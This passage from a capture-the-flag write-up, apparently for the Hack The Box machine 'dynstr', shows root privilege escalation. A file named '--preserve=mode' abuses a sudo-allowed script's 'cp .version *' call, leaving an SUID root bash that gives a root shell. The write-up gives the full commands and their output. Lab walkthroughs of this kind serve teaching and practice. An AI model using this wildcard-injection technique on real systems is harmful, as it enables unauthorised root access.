</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User bindmgr may run the following commands on dynstr:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
</span></span></code></pre></div><p>The author gives a well documented about what this script does.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
</span></span><span class="line"><span class="cl"><span class="c1"># that bind/named can only include single files but no directories.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
</span></span><span class="line"><span class="cl"><span class="c1"># from named.conf.local (or others) and will include all files from the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># directory /etc/bin/named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       named.conf.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       not deleting them. As we generate the list of files to be included</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       from the source directory they won&#39;t be included anyway.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check versioning (.version)</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">42</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">43</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create config file that includes all files from named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check generated configuration with named-checkconf.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
</span></span><span class="line"><span class="cl">named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
</span></span><span class="line"><span class="cl">    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">44</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># systemctl restart bind9</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
</span></span><span class="line"><span class="cl">        systemctl status bind9
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span></code></pre></div><p>The first two <code>if</code> statement show that the script wants a file called <code>.version</code>, and since it looks from <code>$PWD</code>, I can create that file in anywhere.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span></code></pre></div><p>Then when I run the script, it throws the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
</span></span></code></pre></div><p>And this one is interesting</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span></code></pre></div><p>If I trace it, the error come from these lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>According to <a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/">Hackingarticles</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ cp /bin/bash .
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ chmod u+s bash
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">1164</span>
</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version
</span></span></code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/
</span></span></code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span>
</span></span></code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">total <span class="m">1168</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version
</span></span></code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
</span></span><span class="line"><span class="cl">bash-5.0# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span><span class="line"><span class="cl">bash-5.0# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-5.0# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
</span></span><span class="line"><span class="cl">bash-5.0# cat root.txt
</span></span><span class="line"><span class="cl">64348...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
